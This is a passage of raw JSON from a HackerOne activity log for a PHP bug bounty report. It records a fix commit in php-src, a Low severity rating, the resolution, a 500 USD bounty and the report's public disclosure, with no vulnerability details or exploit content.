href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/php/php-src\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, commit 931ea5c872a0a4455c5bbb8470c7a1d049bd8501).\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-07T07:35:06.317Z","updated_at":"2016-11-07T07:35:06.317Z","actor":{"username":"fosec","cleared":false,"url":"/fosec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/117/661/fea0d61725bc84364bc634a31409aa6c8c43ca03_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1339043,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-03T20:46:42.360Z","updated_at":"2016-12-03T20:46:42.360Z","additional_data":{"old_severity":null,"new_severity":"Low","old_severity_id":null,"new_severity_id":11362},"actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1339044,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-03T20:46:48.977Z","updated_at":"2016-12-03T20:46:48.977Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"fosec","url":"/fosec"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1339045,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-03T20:46:53.552Z","updated_at":"2016-12-03T20:46:53.552Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-php","collaborator":{"username":"fosec","url":"/fosec"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6025960,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T09:22:02.942Z","updated_at":"2019-10-13T09:22:02.942Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6285704,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-12T09:22:04.717Z","updated_at":"2019-11-12T09:22:04.717Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}